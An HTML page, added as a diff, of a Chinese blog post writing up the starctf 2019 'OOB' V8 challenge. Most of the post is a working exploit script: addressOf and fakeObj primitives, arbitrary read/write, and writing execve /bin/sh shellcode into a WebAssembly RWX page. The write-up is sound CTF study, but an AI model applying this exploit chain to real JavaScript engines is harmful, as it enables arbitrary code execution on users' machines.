@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"akaieurus.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="实战但没完全实战">
+<meta property="og:type" content="article">
+<meta property="og:title" content="starctf 2019 OOB">
+<meta property="og:url" content="http://akaieurus.github.io/2023/04/13/starctf-2019-OOB/index.html">
+<meta property="og:site_name" content="Eurus禁止摆烂！">
+<meta property="og:description" content="实战但没完全实战">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://akaieurus.github.io/2023/04/13/starctf-2019-OOB/output.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/04/13/starctf-2019-OOB/a.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/04/13/starctf-2019-OOB/change.png">
+<meta property="article:published_time" content="2023-04-13T12:26:12.000Z">
+<meta property="article:modified_time" content="2023-04-14T15:07:23.999Z">
+<meta property="article:author" content="Eurus">
+<meta property="article:tag" content="V8">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://akaieurus.github.io/2023/04/13/starctf-2019-OOB/output.png">
+
+<link rel="canonical" href="http://akaieurus.github.io/2023/04/13/starctf-2019-OOB/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>starctf 2019 OOB | Eurus禁止摆烂！</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Eurus禁止摆烂！</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">In a world of locked rooms, the man with the key is king.</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://akaieurus.github.io/2023/04/13/starctf-2019-OOB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Eurus">
+      <meta itemprop="description" content="本人2022年11月—12月进入了一种原因未知的摆烂状态，故搭建博客来警醒自己。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Eurus禁止摆烂！">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          starctf 2019 OOB
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-04-13 20:26:12" itemprop="dateCreated datePublished" datetime="2023-04-13T20:26:12+08:00">2023-04-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-04-14 23:07:23" itemprop="dateModified" datetime="2023-04-14T23:07:23+08:00">2023-04-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/V8/" itemprop="url" rel="index"><span itemprop="name">V8</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>实战但没完全实战</p>
+<span id="more"></span>
+<h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>（由于不会看C++源码而跳过漏洞分析的我就是个屑o(TヘTo)）<br>在obb.diff中，给变量添加了一个oob函数，存在off by one可以越界读写64bit，test.js如下：</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f64 = <span class="keyword">new</span> Float64Array(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> BigUint64Array(f64.<span class="built_in">buffer</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ftoi</span>(<span class="params">f</span>)</span><br><span class="line">&#123;</span><br><span class="line">  f64[<span class="number">0</span>] = f;</span><br><span class="line">  <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">itof</span>(<span class="params">i</span>)</span><br><span class="line">&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> f64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">i</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> i.toString(<span class="number">16</span>).padStart(<span class="number">8</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = [<span class="number">2.1</span>];</span><br><span class="line"><span class="keyword">var</span> x = a.oob();</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;x is 0x&quot;</span>+hex(ftoi(x)));</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%SystemBreak();</span><br><span class="line">a.oob(<span class="number">2.1</span>);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>
+<p>DebugPrint的内容如下：</p>
+<img src="/2023/04/13/starctf-2019-OOB/output.png" class title="output">
+<p>变量a的结构如下：</p>
+<img src="/2023/04/13/starctf-2019-OOB/a.png" class title="a">
+<p>地址没有压缩，可以看出a.oob()打印出了map的地址<br>继续执行，a.oob(2.1)后的a的内存布局是这样的：</p>
+<img src="/2023/04/13/starctf-2019-OOB/change.png" class title="change">
+<p>a的map被改成了2.1</p>
+<h3 id="套模板编写exp"><a href="#套模板编写exp" class="headerlink" title="套模板编写exp"></a>套模板编写exp</h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//64位浮点数和整数转化相关变量声明</span></span><br><span class="line"><span class="comment">//两个对象以不同方式读写一块内存</span></span><br><span class="line">var f64=<span class="keyword">new</span> <span class="constructor">Float64Array(1)</span>;</span><br><span class="line">var bigUint64=<span class="keyword">new</span> <span class="constructor">BigUint64Array(<span class="params">f64</span>.<span class="params">buffer</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//任意对象读写相关变量声明</span></span><br><span class="line">var double_array=<span class="literal">[<span class="number">1.1</span>]</span>;</span><br><span class="line">var obj=&#123;<span class="string">&quot;a&quot;</span>:<span class="number">1</span>&#125;;</span><br><span class="line">var obj_array=<span class="literal">[<span class="identifier">obj</span>]</span>;</span><br><span class="line">var double_map=double_array.oob<span class="literal">()</span>;</span><br><span class="line">var obj_map=obj_array.oob<span class="literal">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//任意读写相关变量声明</span></span><br><span class="line">var fake_array=<span class="literal">[</span></span><br><span class="line"><span class="literal">	<span class="identifier">double_map</span>,			<span class="operator">/</span><span class="operator">/</span><span class="number">64</span><span class="identifier">bit</span> <span class="identifier">map</span> <span class="identifier">addr</span></span></span><br><span class="line"><span class="literal">	<span class="identifier">itof</span>(<span class="number">0n</span>),			<span class="operator">/</span><span class="operator">/</span><span class="number">64</span><span class="identifier">bit</span> <span class="identifier">properties</span> <span class="identifier">addr</span></span></span><br><span class="line"><span class="literal">	<span class="identifier">itof</span>(<span class="number">0x41414141n</span>),	<span class="operator">/</span><span class="operator">/</span><span class="number">64</span><span class="identifier">bit</span> <span class="identifier">elements</span> <span class="identifier">addr</span></span></span><br><span class="line"><span class="literal">	<span class="identifier">itof</span>(<span class="number">0x100000000n</span>),	<span class="operator">/</span><span class="operator">/</span><span class="number">64</span><span class="identifier">bit</span> <span class="identifier">length</span></span></span><br><span class="line"><span class="literal">]</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//wasm相关变量声明</span></span><br><span class="line">var wasmCode=<span class="keyword">new</span> <span class="constructor">Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11])</span>;</span><br><span class="line">var wasmModule=<span class="keyword">new</span> WebAssembly.<span class="constructor">Module(<span class="params">wasmCode</span>)</span>;</span><br><span class="line">var wasmInstance=<span class="keyword">new</span> WebAssembly.<span class="constructor">Instance(<span class="params">wasmModule</span>,&#123;&#125;)</span>;</span><br><span class="line">var f=wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//64位浮点数和整数相互转化</span></span><br><span class="line"><span class="keyword">function</span> ftoi(f)</span><br><span class="line">&#123;</span><br><span class="line">	f64<span class="literal">[<span class="number">0</span>]</span>=f;</span><br><span class="line">	return bigUint64<span class="literal">[<span class="number">0</span>]</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> itof(i)</span><br><span class="line">&#123;</span><br><span class="line">	bigUint64<span class="literal">[<span class="number">0</span>]</span>=i;</span><br><span class="line">	return f64<span class="literal">[<span class="number">0</span>]</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//十六进制输出</span></span><br><span class="line"><span class="keyword">function</span> hex(i)</span><br><span class="line">&#123;</span><br><span class="line">	return i.<span class="keyword">to</span><span class="constructor">String(16)</span>.pad<span class="constructor">Start(8,<span class="string">&quot;0&quot;</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//任意结构体读写</span></span><br><span class="line"><span class="keyword">function</span> fake<span class="constructor">Obj(<span class="params">addr_to_fake</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    double_array<span class="literal">[<span class="number">0</span>]</span> = itof(addr_to_fake + <span class="number">1n</span>);</span><br><span class="line">    double_array.oob(obj_map);	<span class="comment">//将浮点型数组伪造成对象数组</span></span><br><span class="line">    <span class="keyword">let</span> faked_obj = double_array<span class="literal">[<span class="number">0</span>]</span>;</span><br><span class="line">    double_array.oob(array_map);</span><br><span class="line">    return faked_obj;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> address<span class="constructor">Of(<span class="params">obj_to_leak</span>)</span>	<span class="comment">//将用array伪造的数据转为object</span></span><br><span class="line">&#123;</span><br><span class="line">    obj_array<span class="literal">[<span class="number">0</span>]</span> = obj_to_leak;</span><br><span class="line">    obj_array.oob(double_map);	<span class="comment">//将对象数组伪造成浮点型数组</span></span><br><span class="line">    <span class="keyword">let</span> obj_addr = ftoi(obj_array<span class="literal">[<span class="number">0</span>]</span>) - <span class="number">1n</span>;</span><br><span class="line">    obj_array.oob(obj_map);</span><br><span class="line">    return obj_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//任意读写函数</span></span><br><span class="line"><span class="keyword">function</span> read64(addr)</span><br><span class="line">&#123;</span><br><span class="line">	fake_array<span class="literal">[<span class="number">2</span>]</span>=itof(addr-<span class="number">0x10n</span>+<span class="number">1n</span>);</span><br><span class="line">	return fake_object<span class="literal">[<span class="number">0</span>]</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> write64(addr,data)</span><br><span class="line">&#123;</span><br><span class="line">	fake_array<span class="literal">[<span class="number">2</span>]</span>=itof(addr-<span class="number">0x10n</span>+<span class="number">1n</span>);</span><br><span class="line">	fake_object<span class="literal">[<span class="number">0</span>]</span>=itof(data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//shellcode写如rwx函数</span></span><br><span class="line"><span class="keyword">function</span> copy<span class="constructor">_shellcode_to_rwx(<span class="params">shellcode</span>,<span class="params">rwx_addr</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	var data_buf=<span class="keyword">new</span> <span class="constructor">ArrayBuffer(<span class="params">shellcode</span>.<span class="params">length</span><span class="operator">*</span>8)</span>;</span><br><span class="line">	var data_view=<span class="keyword">new</span> <span class="constructor">DataView(<span class="params">data_buf</span>)</span>;</span><br><span class="line">	var buf_backing_store_addr=address<span class="constructor">Of(<span class="params">data_buf</span>)</span>+<span class="number">0x20n</span>;</span><br><span class="line">	console.log(<span class="string">&quot;[*] buf_backing_store_addr: 0x&quot;</span>+hex(buf_backing_store_addr));</span><br><span class="line"></span><br><span class="line">	write64(buf_backing_store_addr,ftoi(rwx_addr));</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;shellcode.length;++i)</span><br><span class="line">		data_view.set<span class="constructor">Float64(<span class="params">i</span><span class="operator">*</span>8,<span class="params">itof</span>(<span class="params">shellcode</span>[<span class="params">i</span>],<span class="params">true</span>)</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将用array伪造的fake_object转化为object</span></span><br><span class="line">fake_array_addr=address<span class="constructor">Of(<span class="params">fake_array</span>)</span>;</span><br><span class="line">console.log(<span class="string">&quot;[*] leak fake_array addr: 0x&quot;</span>+hex(fake_array_addr));</span><br><span class="line">fake_object_addr=fake_array_addr+<span class="number">0x30n</span>;	<span class="comment">//fake_array的elements在+0x30的位置</span></span><br><span class="line">var fake_object=fake<span class="constructor">Obj(<span class="params">fake_object_addr</span>)</span>;</span><br><span class="line"></span><br><span class="line">var wasm_instance_addr=address<span class="constructor">Of(<span class="params">wasmInstance</span>)</span>;</span><br><span class="line">console.log(<span class="string">&quot;[*] leak wasm_instance addr: 0x&quot;</span> + hex(wasm_instance_addr));</span><br><span class="line">var rwx_page_addr=read64(wasm_instance_addr+<span class="number">0x88</span>);</span><br><span class="line">console.log(<span class="string">&quot;[*] leak rwx_page_addr: 0x&quot;</span> + hex(ftoi(rwx_page_addr)));</span><br><span class="line"></span><br><span class="line">var shellcode=<span class="literal">[</span></span><br><span class="line"><span class="literal">	<span class="number">0x2fbb485299583b6an</span>,</span></span><br><span class="line"><span class="literal">	<span class="number">0x5368732f6e69622fn</span>,</span></span><br><span class="line"><span class="literal">	<span class="number">0x050f5e5457525f54n</span></span></span><br><span class="line"><span class="literal">]</span>;</span><br><span class="line"></span><br><span class="line">copy<span class="constructor">_shellcode_to_rwx(<span class="params">shellcode</span>,<span class="params">rwx_page_addr</span>)</span></span><br><span class="line">f<span class="literal">()</span>;</span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/V8/" rel="tag"># V8</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/04/12/V8%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/" rel="prev" title="V8通用利用链">
+      <i class="fa fa-chevron-left"></i> V8通用利用链
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="nav-number">1.</span> <span class="nav-text">漏洞点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A5%97%E6%A8%A1%E6%9D%BF%E7%BC%96%E5%86%99exp"><span class="nav-number">2.</span> <span class="nav-text">套模板编写exp</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Eurus"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Eurus</p>
+  <div class="site-description" itemprop="description">本人2022年11月—12月进入了一种原因未知的摆烂状态，故搭建博客来警醒自己。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/akaieurus" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;akaieurus" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1826983968@qq.com" title="E-Mail → 1826983968@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">true</span>
+</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+    <script defer src="/lib/three/canvas_lines.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+  <script async src="/js/cursor/fireworks.js"></script>
+
+</body>
+</html>
